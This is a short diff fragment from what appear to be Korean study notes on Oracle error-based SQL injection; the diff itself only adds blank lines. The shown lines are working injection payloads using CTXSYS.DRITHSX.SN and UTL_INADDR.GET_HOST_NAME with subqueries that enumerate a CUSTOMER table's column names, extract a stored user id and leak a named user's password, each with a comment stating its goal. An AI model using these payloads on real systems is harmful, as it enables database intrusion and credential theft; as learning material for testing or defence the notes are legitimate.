@@ -17,3 +17,7 @@ CTXSYS.DRITHSX.SN(user,(원하는 서브쿼리 내용)) 됨
 ' and CTXSYS.DRITHSX.SN(user,(SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME, ROWNUM AS RNUM FROM all_tab_columns where TABLE_NAME='CUSTOMER') WHERE RNUM=3))=1 -- 커스터머의 컬럼명 알아내기
 ' and CTXSYS.DRITHSX.SN(user,(SELECT name FROM (SELECT name, ROWNUM AS RNUM FROM customer) WHERE RNUM=25))=1 --25번째 데이터에 있는 아이디 알아내기
 ' and UTL_INADDR.GET_HOST_NAME((select password from customer where name='hashpassword'))=1 -- NAME이 hashpassword 인 데이터의 password 알아내기
+
+
+
+
